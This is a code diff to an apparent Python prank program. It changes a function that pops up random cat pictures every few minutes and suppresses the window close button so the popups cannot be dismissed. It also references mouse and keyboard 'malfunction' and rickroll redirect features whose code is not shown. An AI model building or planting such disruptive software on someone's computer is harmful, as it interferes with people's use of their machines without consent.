@@ -330,17 +330,31 @@ def funny_windows():
     from urllib.request import urlopen, Request
     import tkinter as tk
     import PIL.ImageTk, PIL.ImageFile
-    
+    import threading
+
     url = 'https://cataas.com/cat?position=center&width=1000&height=1000&json=true'
     req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-    while True:
-        time.sleep(random.randint(60, 600))
-        response = json.loads(urlopen(req).read())
 
+    root = tk.Tk()
+    root.withdraw()  # Hide the root window
+
+    last_window = {'window': None} # Track the window we need to close
+
+    def show_cat():
+
+        if last_window['window'] is not None:
+            last_window['window'].destroy()
+
+        response = json.loads(urlopen(req).read())
         window = tk.Toplevel()
         window.resizable(False, False)
 
-        image_content_url, mime_type= response['url'], response['mimetype'][6:]  # mimetype is like 'image/png'
+        def on_close():
+            pass  # Prevent closing
+
+        window.protocol("WM_DELETE_WINDOW", on_close)
+
+        image_content_url, mime_type = response['url'], response['mimetype'][6:]
         image_data = urlopen(image_content_url).read()
         parser = PIL.ImageFile.Parser()
         parser.feed(image_data)
@@ -348,13 +362,16 @@ def funny_windows():
 
         canvas = tk.Canvas(window, width=image.width(), height=image.height())
         canvas.create_image(0, 0, image=image, anchor='nw')
-        canvas.pack(padx=0, pady=0) # Make it fit
-
+        canvas.pack(padx=0, pady=0)
         window.title("Meow :3")
-        window.update()
 
-        if window.winfo_exists():
-            window.destroy()
+        # Schedule next popup
+        delay = random.randint(60, 600) * 1000  # milliseconds
+        root.after(delay, show_cat)
+
+    # Start the first popup
+    root.after(0, show_cat)
+    root.mainloop()
 
 
 # Feature 3 - Random rickroll redirects, no idea how to do this yet...
@@ -375,11 +392,10 @@ def redirects():
 
 # Example usage for now
 def main():
-    threading.Thread(target=funny_windows).start()
     threading.Thread(target=mouse_malfunction()).start()
     threading.Thread(target=keyboard_malfunction()).start()
     threading.Thread(target=redirects).start()
-    
+    funny_windows()
 
 
 if __name__ == "__main__":
